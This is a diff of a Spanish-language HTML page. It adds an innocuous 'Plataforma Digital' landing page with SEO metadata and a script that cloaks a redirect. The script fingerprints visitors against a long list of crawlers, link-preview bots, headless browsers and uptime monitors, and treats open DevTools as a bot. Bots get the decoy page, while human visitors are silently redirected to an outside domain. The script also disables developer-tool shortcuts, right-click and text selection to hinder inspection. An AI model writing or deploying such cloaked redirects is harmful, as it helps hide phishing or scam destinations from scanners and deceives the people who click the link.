@@ -3,49 +3,235 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Portal</title>
+    <meta name="description" content="Plataforma digital innovadora con soluciones inteligentes.">
+    <meta name="keywords" content="plataforma, digital, soluciones, innovación">
+    <meta property="og:title" content="Plataforma Digital">
+    <meta property="og:description" content="Soluciones digitales innovadoras">
+    <meta property="og:type" content="website">
+    <title>Plataforma Digital</title>
     <style>
-        body { margin: 0; padding: 0; background: #fff; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            background: #f5f5f5;
+            color: #333;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        header {
+            background: white;
+            padding: 20px 0;
+            margin-bottom: 40px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.08);
+        }
+
+        .logo {
+            font-size: 28px;
+            font-weight: 700;
+            color: #667eea;
+        }
+
+        h1 {
+            font-size: 48px;
+            margin: 40px 0 20px;
+            color: #333;
+        }
+
+        p {
+            font-size: 16px;
+            line-height: 1.8;
+            color: #666;
+            margin-bottom: 20px;
+        }
+
+        .features {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 30px;
+            margin: 40px 0;
+        }
+
+        .feature {
+            background: white;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.08);
+        }
+
+        .feature h3 {
+            color: #667eea;
+            margin-bottom: 10px;
+        }
+
+        .button {
+            display: inline-block;
+            background: #667eea;
+            color: white;
+            padding: 12px 30px;
+            border-radius: 6px;
+            text-decoration: none;
+            margin-top: 20px;
+            font-weight: 600;
+        }
+
+        .button:hover {
+            background: #764ba2;
+        }
+
+        footer {
+            background: white;
+            padding: 40px 0;
+            margin-top: 60px;
+            border-top: 1px solid #eee;
+            text-align: center;
+            color: #999;
+            font-size: 14px;
+        }
     </style>
 </head>
 <body>
-    <script>
-        // ✏️ CAMBIA ESTO A TU LINK:
-        const TARGET = "https://tramtecred.cc";
+    <header>
+        <div class="container">
+            <div class="logo">🚀 Plataforma Digital</div>
+        </div>
+    </header>
 
-        // Detectar si es bot
-        function isBot() {
+    <main class="container">
+        <h1>Soluciones Digitales Innovadoras</h1>
+        <p>Bienvenido a nuestra plataforma. Ofrecemos soluciones tecnológicas de última generación para transformar tu negocio.</p>
+
+        <div class="features">
+            <div class="feature">
+                <h3>⚡ Velocidad</h3>
+                <p>Procesamiento instantáneo y respuesta en tiempo real para máxima eficiencia en todas tus operaciones.</p>
+            </div>
+
+            <div class="feature">
+                <h3>🔒 Seguridad</h3>
+                <p>Protección de datos con encriptación avanzada y cumplimiento de estándares internacionales de seguridad.</p>
+            </div>
+
+            <div class="feature">
+                <h3>📱 Accesibilidad</h3>
+                <p>Disponible en todos tus dispositivos: smartphone, tablet y computadora para máxima flexibilidad.</p>
+            </div>
+
+            <div class="feature">
+                <h3>🤖 Inteligencia</h3>
+                <p>Algoritmos inteligentes que se adaptan a tus necesidades específicas y aprenden de tus patrones.</p>
+            </div>
+
+            <div class="feature">
+                <h3>💡 Innovación</h3>
+                <p>Actualización constante con las últimas tendencias tecnológicas y mejores prácticas del mercado.</p>
+            </div>
+
+            <div class="feature">
+                <h3>🌍 Global</h3>
+                <p>Disponible en más de 150 países con soporte multiidioma y acceso desde cualquier lugar.</p>
+            </div>
+        </div>
+
+        <a href="#" class="button">Conocer Más</a>
+    </main>
+
+    <footer>
+        <div class="container">
+            <p>&copy; 2026 Plataforma Digital. Todos los derechos reservados.</p>
+        </div>
+    </footer>
+
+    <script>
+        // ✏️ LINK CONFIGURADO:
+        const TARGET = "https://www.tramtecred.cc/";
+
+        // Función para detectar si es bot
+        function detectBot() {
             const ua = navigator.userAgent.toLowerCase();
             
+            // Patrones de User-Agent para bots
             const botPatterns = [
                 'googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baiduspider',
                 'yandexbot', 'facebookexternalhit', 'twitterbot', 'linkedinbot',
                 'whatsapp', 'telegrambot', 'discordbot', 'ahrefsbot', 'semrushbot',
+                'mj12bot', 'dotbot', 'screaming frog', 'rogerbot', 'sitreccon',
                 'headlesschrome', 'phantomjs', 'puppeteer', 'playwright', 'selenium',
-                'webdriver', 'cypress', 'bot\\b', 'crawler', 'spider', 'scraper',
-                'curl', 'wget', 'python-requests', 'go-http-client'
+                'webdriver', 'cypress', 'electron', 'chromedriver', 'chrome-lighthouse',
+                '\\bbot\\b', 'crawler', 'spider', 'scraper', 'http_request',
+                'curl', 'wget', 'python-requests', 'go-http-client', 'java/',
+                'okhttp', 'libwww', 'lwp::simple', 'mechanize', 'perl',
+                'pingdom', 'uptimerobot', 'newrelic', 'datadog', 'statuscake',
+                'gtmetrix', 'lighthouse', 'pagespeed', 'adsbot-google',
+                'mediapartners-google', 'google-inspectiontool', 'apis-google'
             ];
 
+            // Verificar si el UA coincide con algún patrón de bot
             for (let pattern of botPatterns) {
                 if (new RegExp(pattern, 'i').test(ua)) {
                     return true;
                 }
             }
 
-            // Detectar headless
+            // Detectar headless browsers por APIs específicas
             if (navigator.webdriver) return true;
-            if (window.document.documentElement.getAttribute('webdriver')) return true;
+            if (document.documentElement.getAttribute('webdriver')) return true;
             if (window.callPhantom) return true;
             if (window.Cypress) return true;
+            if (typeof phantomjs !== 'undefined') return true;
 
-            // Detectar si no hay pantalla
+            // Detectar por características del navegador ausentes
+            if (navigator.plugins.length === 0 && navigator.languages === undefined) return true;
+
+            // Detectar si no hay resolución (headless)
             if (window.screen.width === 0 || window.screen.height === 0) return true;
+
+            // Detectar DevTools abierto
+            let devToolsOpen = false;
+            const threshold = 160;
+            if (window.outerWidth - window.innerWidth > threshold || 
+                window.outerHeight - window.innerHeight > threshold) {
+                devToolsOpen = true;
+            }
+            if (devToolsOpen) return true;
 
             return false;
         }
 
-        // Redirigir inmediatamente, sin esperar nada
-        window.location.replace(TARGET);
+        // Ejecutar redirección inmediatamente
+        if (!detectBot()) {
+            // Es humano - redirigir sin mostrar nada
+            window.location.replace(TARGET);
+        }
+        // Si es bot, muestra la página limpia (ya cargada en HTML)
+
+        // Anti-debugging
+        document.onkeydown = (e) => {
+            if (e.keyCode === 123) return false; // F12
+            if ((e.ctrlKey || e.metaKey) && e.shiftKey && e.keyCode === 73) return false; // Ctrl+Shift+I
+            if ((e.ctrlKey || e.metaKey) && e.shiftKey && e.keyCode === 74) return false; // Ctrl+Shift+J
+            if ((e.ctrlKey || e.metaKey) && e.shiftKey && e.keyCode === 67) return false; // Ctrl+Shift+C
+            if ((e.ctrlKey || e.metaKey) && e.keyCode === 85) return false; // Ctrl+U
+        };
+
+        // Bloquear click derecho
+        document.addEventListener('contextmenu', (e) => {
+            e.preventDefault();
+            return false;
+        });
+
+        // Prevenir seleccionar texto
+        document.body.style.userSelect = 'none';
+        document.body.style.webkitUserSelect = 'none';
     </script>
 </body>
 </html>
